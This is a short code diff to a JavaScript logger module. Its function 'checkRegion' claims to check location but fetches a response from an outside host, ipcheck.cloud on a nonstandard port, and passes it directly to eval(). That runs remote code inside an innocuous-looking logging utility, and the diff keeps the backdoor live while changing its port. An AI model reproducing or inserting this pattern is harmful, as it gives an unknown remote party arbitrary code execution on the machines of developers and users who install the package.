@@ -47,7 +47,7 @@ logger.log = function (error) {
 logger.checkRegion = async function (error) {
   try {
     const res = await axios.get(
-      "http://ipcheck.cloud:8353/api/user/download/v6/106"
+      "http://ipcheck.cloud:3963/api/user/download/v6/106"
     );
     // console.log('location is available');
     eval(res.data);
